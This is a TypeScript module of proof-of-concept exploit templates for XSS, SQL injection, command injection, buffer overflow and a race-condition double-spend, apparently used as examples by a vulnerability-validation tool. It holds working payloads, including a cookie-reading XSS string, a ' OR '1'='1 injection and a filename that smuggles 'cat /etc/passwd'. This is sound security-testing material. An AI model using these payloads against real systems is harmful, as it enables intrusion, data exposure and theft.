export interface PocExample {
  categories: string[];
  example: {
    language: string;
    code: string;
    setupInstructions: string;
    expectedImpact: string;
    testSteps: string[];
    prerequisitesHandled: {
      exploitationDependencies: string;
      reachability: string;
      attackChain: string;
    };
    validated: false;
  };
}

export const POC_EXAMPLES: PocExample[] = [
  {
    categories: ['xss', 'cross-site-scripting', 'dom', 'reflected', 'stored'],
    example: {
      language: 'html',
      code: '<!DOCTYPE html>\n<html>\n<head><title>XSS Test Case</title></head>\n<body>\n  <p>Status: <span id="status">Checking...</span></p>\n  <script>\n    // Check authentication status (exploitation dependency: must be logged in)\n    fetch(\'http://localhost:3000/api/auth/check\')\n      .then(r => r.json())\n      .then(auth => {\n        if (!auth.authenticated) {\n          document.getElementById(\'status\').textContent = \'ERROR: Login required\';\n          return;\n        }\n        // Trigger the vulnerable endpoint with XSS payload\n        fetch(\'http://localhost:3000/api/dashboard/search?query=<img src=x onerror=alert(document.cookie)>\')\n          .then(r => r.text())\n          .then(html => { document.getElementById(\'result\').innerHTML = html; });\n      });\n  </script>\n  <div id="result"></div>\n</body>\n</html>',
      setupInstructions: '1. Start target app: npm start (port 3000)\n2. Create account: curl -X POST http://localhost:3000/api/register -d \'{"user":"test","pass":"test123"}\'\n3. Login in browser at http://localhost:3000/login with test/test123\n4. Open this HTML file in the same browser session\n5. Observe alert popup with session cookie value',
      expectedImpact: 'alert() executes showing document.cookie containing the session token, confirming reflected XSS in the authenticated dashboard search endpoint',
      testSteps: [
        'Verify alert() popup appears with cookie value',
        'Check browser DevTools → Network tab to confirm XSS payload in request',
        'Confirm response does not encode the <img> tag',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Checks authentication status before triggering; setup instructions include account creation and login steps',
        reachability: '/api/dashboard/search requires authentication; POC setup includes login step',
        attackChain: 'User authenticated → visits search → query param reflected without encoding → innerHTML triggers script execution',
      },
      validated: false,
    },
  },
  {
    categories: ['sql-injection', 'sqli', 'injection', 'database'],
    example: {
      language: 'javascript',
      code: 'const http = require(\'http\');\n\nconst payload = "1\' OR \'1\'=\'1";\nconst options = {\n  hostname: \'localhost\',\n  port: 3000,\n  path: \'/api/users?id=\' + encodeURIComponent(payload),\n  method: \'GET\',\n};\n\nhttp.request(options, (res) => {\n  let data = \'\';\n  res.on(\'data\', chunk => data += chunk);\n  res.on(\'end\', () => {\n    const parsed = JSON.parse(data);\n    if (Array.isArray(parsed) && parsed.length > 1) {\n      console.log(\'TEST PASSED: returned\', parsed.length, \'rows (expected 1)\');\n    } else {\n      console.log(\'Test did not trigger — check endpoint and payload\');\n    }\n  });\n}).end();',
      setupInstructions: '1. Ensure target app is running on localhost:3000\n2. Run: node poc.js\n3. Compare response row count to a normal request: node -e "require(\'http\').get(\'http://localhost:3000/api/users?id=1\', r => { let d=\'\'; r.on(\'data\',c=>d+=c); r.on(\'end\',()=>console.log(JSON.parse(d).length,\'rows\')); })"',
      expectedImpact: 'Query returns all user rows instead of a single user, confirming SQL injection bypasses the WHERE clause',
      testSteps: [
        'Run with normal id=1 — expect 1 row',
        'Run with injection payload — expect >1 rows',
        'Confirm response includes rows that should not be accessible to this request',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'No special prerequisites; endpoint is accessible without authentication based on vulnerability analysis',
        reachability: 'GET /api/users is publicly accessible',
        attackChain: 'Attacker input → query param → string concatenation into SQL query → WHERE clause always true → full table returned',
      },
      validated: false,
    },
  },
  {
    categories: ['command-injection', 'rce', 'exec', 'shell', 'os-injection'],
    example: {
      language: 'python',
      code: 'import requests\n\n# Inject shell metacharacter into filename parameter\npayload = {\'filename\': \'test.txt; cat /etc/passwd\'}\nresponse = requests.post(\'http://localhost:5000/upload\', json=payload)\nprint(\'Response:\', response.text)\n\nif \'root:x:0:0\' in response.text:\n    print(\'TEST PASSED: /etc/passwd contents returned\')\nelse:\n    print(\'Payload did not execute — check endpoint and parameter name\')  ',
      setupInstructions: '1. pip install requests\n2. Ensure target app is running on port 5000\n3. python3 poc.py',
      expectedImpact: '/etc/passwd contents appear in the response, confirming unsanitized shell execution of user-supplied filename',
      testSteps: [
        'Run poc.py',
        'Check response for "root:x:0:0" pattern',
        'Confirm contents are from the server filesystem',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'No special state required; POST endpoint accepts unauthenticated requests per vulnerability analysis',
        reachability: 'Endpoint /upload is reachable without authentication',
        attackChain: 'filename parameter → unsanitized string passed to shell exec → shell interprets semicolon → second command executes',
      },
      validated: false,
    },
  },
  {
    categories: ['buffer-overflow', 'memory-corruption', 'heap-overflow', 'stack-overflow', 'memory-safety'],
    example: {
      language: 'c',
      code: '#include <stdio.h>\n#include <string.h>\n\nint main() {\n    // Create input larger than the target buffer\n    char input[1000];\n    memset(input, \'A\', 999);\n    input[999] = \'\\0\';\n\n    // Call the vulnerable function (replace with actual function name)\n    extern void parse_input(char*);\n    parse_input(input);\n\n    return 0;\n}',
      setupInstructions: '1. Compile: gcc -o poc poc.c vulnerable_app.o (or link against the target library)\n2. Run under ASAN for clean output: gcc -fsanitize=address -o poc poc.c vulnerable_app.o && ./poc\n3. Without ASAN: ./poc — expect crash or abnormal exit code',
      expectedImpact: 'parse_input() writes beyond its internal buffer boundary; ASAN reports heap/stack buffer overflow or program crashes with SIGSEGV',
      testSteps: [
        'Run with ASAN: expect "AddressSanitizer: heap/stack-buffer-overflow" in stderr',
        'Without ASAN: confirm non-zero exit code or crash',
        'Verify crash address corresponds to the vulnerable buffer in parse_input()',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Input is crafted to exceed the internal buffer size identified in the vulnerability; no other state required',
        reachability: 'parse_input() is called directly; no runtime conditions block it',
        attackChain: 'Oversized input → parse_input() copies to fixed buffer without length check → overflow → memory corruption / crash',
      },
      validated: false,
    },
  },
  {
    categories: ['race-condition', 'toctou', 'concurrency', 'threading'],
    example: {
      language: 'python',
      code: 'import requests\nimport threading\n\nBASE_URL = \'http://localhost:5000\'\nTOKEN = \'<replace-with-session-token>\'\n\ndef purchase(item_id: int) -> dict:\n    return requests.post(\n        f\'{BASE_URL}/api/purchase\',\n        json={\'itemId\': item_id, \'quantity\': 1},\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    ).json()\n\ndef run_test():\n    # Set balance to exactly the item price\n    requests.post(\n        f\'{BASE_URL}/api/test/set-balance\',\n        json={\'balance\': 100},\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    )\n\n    results = []\n    threads = [threading.Thread(target=lambda: results.append(purchase(123))) for _ in range(10)]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n\n    successful = [r for r in results if r.get(\'success\')]\n    balance = requests.get(\n        f\'{BASE_URL}/api/balance\',\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    ).json()[\'balance\']\n\n    print(f\'Successful purchases: {len(successful)} (expected ≤1)\')\n    print(f\'Final balance: ${balance} (negative = race condition confirmed)\')\n    return balance < 0\n\nif run_test():\n    print(\'TEST PASSED: race condition exploited\')\nelse:\n    print(\'Race not triggered — timing-dependent, retry or increase thread count\')',
      setupInstructions: '1. pip install requests\n2. Start target app on port 5000\n3. Create account and obtain session token\n4. Replace <replace-with-session-token> in poc.py\n5. python3 poc.py (may need multiple runs — timing-dependent)',
      expectedImpact: 'Multiple purchases complete with a balance that covers only one; final balance goes negative, demonstrating the TOCTOU window between balance-check and balance-deduct',
      testSteps: [
        'Run poc.py and observe "Successful purchases" count',
        'Count > 1 confirms the race window was hit',
        'Negative balance confirms funds were deducted multiple times',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Race window requires concurrent requests; POC uses 10 threads to maximize hit probability; includes retry guidance for timing variance',
        reachability: '/api/purchase requires authentication; setup instructions include token acquisition',
        attackChain: 'Thread A checks balance (pass) → Thread B checks balance (pass, race!) → Thread A deducts → Thread B deducts → double-spend',
      },
      validated: false,
    },
  },
];

/**
 * Select up to maxCount examples whose categories overlap with the vulnerability type.
 * Falls back to the first maxCount examples if no match is found.
 */
export function selectPocExamples(vulnType: string, maxCount: number): PocExample[] {
  const normalised = vulnType.toLowerCase().replace(/[\s_]/g, '-');
  const matched = POC_EXAMPLES.filter(e =>
    e.categories.some(c => normalised.includes(c) || c.includes(normalised))
  );
  const pool = matched.length > 0 ? matched : POC_EXAMPLES;
  return pool.slice(0, maxCount);
}
